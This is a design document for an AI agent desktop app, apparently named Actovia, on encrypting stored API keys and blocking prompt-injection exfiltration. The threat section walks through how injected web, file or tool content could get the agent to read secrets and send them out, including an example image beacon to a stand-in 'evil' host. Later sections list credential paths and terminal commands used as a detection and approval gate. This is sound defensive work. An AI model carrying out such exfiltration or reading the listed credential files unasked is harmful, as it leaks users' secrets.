# Secrets at rest and prompt-injection exfiltration — design

Status: agreed in conversation on 2026-09-25 (items 1–4 from the threat walk-through, plus encryption at rest:
"按 1 到 4 写设计吧, 但我还是觉得既然做了, 那就把 safeStorage 一起做了"). Reference: `docs/security-hardening.md`.

**Goal of this round (owner):** every secret Actovia stores is encrypted, and no injected instruction can get one out
of Actovia. Secrets that live elsewhere on the machine are intercepted and the user decides.

## 1. Threat

Untrusted content reaches the model — web pages (`web_fetch`, `web_search`, deep research), MCP results, files it
reads, installed skills, screen content in computer use. A prompt injection can then (a) **read** secrets — the local
API returns every provider key in plaintext to any loopback caller, and `web_fetch` / `terminal` are loopback callers
— and (b) **exfiltrate** them — a `web_fetch` / `web_search` query, `terminal`, or with no tool at all: a markdown
image `![](https://evil/?k=…)` in the reply, which the renderer loads because the CSP says `img-src *`.

`terminal` / `read_file` can still read anything the user can; this design does not sandbox them (future: an approval
mode, a loopback API token). It removes the easy paths: no plaintext secret over the API, no silent image beacon, no
self-API via `web_fetch`, an explicit hard stop in the prompt, and nothing readable at rest.

## 2. Changes

### 2.1 Remote images in chat load on tap (renderer)

`markdown.tsx`'s `img`: `data:` URLs, the app's own media route (`/api/v1/media/…`) and images from the run's own web
search results (the exact image URLs the search returned — never their hosts; amended by the final review, I6) load; any other remote `src` renders a placeholder with the host name and a "Load image"
button (per image, per session). Link clicks are unchanged (they already open externally through
`openExternalSafely`). The CSP keeps `img-src *` (the gate is the component; a CSP cannot express click-to-load) —
documented. The iOS app already works this way (`MarkdownImagePolicy`).

### 2.2 Secrets never leave the main process in plaintext (API)

- **Registry:** one list of secret fields — `providers.{openaiApiKey, azureOpenaiApiKey, anthropicApiKey,
  googleGeminiApiKey, xAiApiKey}`, `googleCloud.googleApiKey`, `webSearch.braveApiKey`, `fullTextSearch.elasticsearch
  .password`, `knowledgeBase.apiKey`, `s3.{accessKeyId, secretAccessKey}`, every other key-like field the schema holds
  (the implementer greps the schema and the Settings pages; a test fails when a new `*Key|*Secret|*Password|*Token`
  field is added without a registry decision), plus `mcp_server.env` / `headers` values.
- **Reads:** `GET /api/v1/settings` and `GET /api/v1/mcp` return a secret as a mask `"•••• abcd"` (last 4, or `"••••"`
  when shorter than 12) — never the value. Main-process code (providers, tools, jobs) reads secrets through the
  in-process settings (unchanged call sites; `getSettings()` keeps returning plaintext inside main).
- **Writes:** a posted value equal to the current mask means "unchanged"; `null` / `""` clears; anything else sets.
  This keeps the desktop autosave (which posts whole sections) and the iOS app (column read-modify-write) working
  without knowing about masks. The desktop key inputs show the mask and replace it on focus-and-type; iOS
  `SecureField`s keep working (they post the mask back untouched).
- **List-models:** `POST /api/v1/settings/models` already takes the key from the request; when the request carries a
  mask, the server substitutes the stored key.

### 2.3 Secrets encrypted at rest (safeStorage)

- Values in the registry are stored as `enc:v1:<base64>` from Electron `safeStorage.encryptString` (macOS Keychain /
  Windows DPAPI / Linux libsecret). Encrypt on write, decrypt when settings are loaded into the in-process cache.
- **Migration at startup** (idempotent): plaintext registry values are encrypted in place; a value already prefixed
  is left alone. Logged once, values never logged.
- **Unavailable safeStorage** (Linux without a keyring, `getSelectedStorageBackend() === 'basic_text'`): keep plaintext,
  log a warning once, show a Settings notice; never block the app.
- **Decrypt failure** (a different machine, a changed code-signing identity, a restored backup from elsewhere): the
  field reads as unset, a Settings notice says which keys need re-entering; never crash, never send the ciphertext as
  a key.
- **Backups / export:** `~/.actovia/backups` dumps carry ciphertext (fine on the same machine) — except a backup written before this pass, and any written while encryption is unavailable, which carry plaintext; the tools are refused `backups/` (2.5, final review I4/M7). `db-io` export: check
  whether settings are exported; if they are, export secrets **masked out** (not plaintext, not ciphertext) and say so
  in the export UI copy.
- CLAUDE.md's "When a Developer ID exists" checklist already lists safeStorage data; add the settings secrets to it.

### 2.4 `web_fetch` cannot reach Actovia itself

`web_fetch` (and deep research's page fetch, if it has its own) refuses a URL whose host resolves to a loopback or
local-interface address **and** whose port is `SERVER_PORT` (60223) or `LAN_SERVER_PORT` (63129) — including
`localhost`, `127.0.0.1`, `[::1]`, `0.0.0.0` and this machine's LAN IPs — checked on every redirect hop. Other local and
LAN services stay reachable (the user's intranet use case). Reuse `src/main/lib/net/safe-fetch.ts`'s resolution helpers.

### 2.5 Secrets outside Actovia: the user decides (approval gate)

Owner's rule (2026-09-25): Actovia's own secrets are defended without exception (2.2–2.4); secrets elsewhere on the
machine are **intercepted and left to the user** — real work sometimes needs the model to read a private key.

- **Gate, not just a prompt line.** In the kernel's `beforeToolCall`, a call is paused for approval when it touches a
  sensitive path: `read_file` / `write_file` / `edit_file` / `list_directory` / `find_files` / `grep` whose resolved
  path is under `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/**/credentials*`, `~/.docker/config.json`, `~/.netrc`,
  `~/.kube`, the macOS keychains, or a `.env*` / `*.pem` / `*.key` / `id_*` file outside the chat workspace; and
  `terminal` commands that mention one of those paths or call `security find-*-password`, `cat`/`cp`/`scp` on them
  (a documented heuristic, not a parser). One shared matcher, table-tested.
- **`~/.actovia` itself is not a "user decides" path:** `lock.dat` and `tls/` are refused outright, and so are the raw
  data files — `database/`, `backups/`, `analytics/`. Those hold only ciphertext while encryption at rest is on (2.3),
  but not in two states: a backup written before encryption existed holds every key in plaintext, and while
  `safeStorage` is unavailable so does everything new. No tool needs them (chats are read through `lcm_*`). The rest
  of `~/.actovia` (workspaces, media, logs) stays readable. (Amended by the final review, I4.)
- **Beyond the first list (final review, I2 + I3):** the credential table also covers the common token files
  (`.npmrc`, `.git-credentials`, `.config/gh`, `.config/gcloud`, cloud CLIs, `.password-store`, browser profiles, backup
  copies of key files), the terminal heuristic covers CLI print-token commands and process-argument listings (`ps`),
  and `call_mcp_tool` is matched on every string leaf of its `arguments`.
- **Approval flow:** the paused call emits an SSE event `{ type: 'approval_required', runId, toolCallId, toolName,
  summary }` (summary = the path or command, never file contents); the run waits; the renderer shows an approval card
  in the timeline — **Allow once**, **Deny** — and `POST /api/v1/chat/approval { runId, toolCallId, decision }`
  resumes it. Deny → the tool returns "The user declined access to <path>." to the model. No answer within 10
  minutes → denied. Stop → denied. Allowed-once is per call, not remembered.
- **The iOS app:** the same card on the phone (the remote principle: the user may be away from the desk) — a follow-up
  iOS task; until then iOS shows "Waiting for approval on your computer".
- **Prompt:** add to `<hard_stops>` in `prompts.ts`: ask before sending data from this machine to a third party the
  user did not ask for (a URL carrying local data, an upload, a paste service); mention that reading credentials is
  gated and the user may decline — explain what you need and why. `prompts.test.ts` pins the lines.

## 3. Out of scope (recorded as open items)

A loopback API token for the renderer; a general terminal approval mode (only the sensitive-path heuristic is gated);
sandboxing `read_file`; DNS-rebinding hardening of `web_fetch` beyond the port rule; encrypting non-secret data (chats,
memory). The approval card on the iOS app is a follow-up task.

## 4. Testing

- Renderer: remote image placeholder + tap-to-load; local media / data / search-result images load; memoized, no
  render-path regression.
- API: secrets masked in GET /settings and GET /mcp (every registry field); mask round-trip keeps the value; clear;
  set; list-models substitutes a mask; the registry-coverage test.
- safeStorage: encrypt-on-write, decrypt-on-load, startup migration idempotent, unavailable backend → plaintext +
  notice, decrypt failure → unset + notice (safeStorage mocked; PGlite real).
- web_fetch: own ports on loopback / LAN IP / localhost / redirect refused; another local port allowed.
- Approval gate: the sensitive-path matcher table (paths, `.env` in vs outside the workspace, terminal heuristics,
  false positives such as `~/.sshconfig-notes`); a faux run: sensitive `read_file` → `approval_required` → allow →
  tool runs; deny → declined result; timeout and Stop → denied; `lock.dat` refused without asking; e2e for the card.
- Prompt: the hard-stop lines present.
- The iOS app: Providers page with masked values — display, unchanged save, replace (a small iOS task after the desktop
  lands).
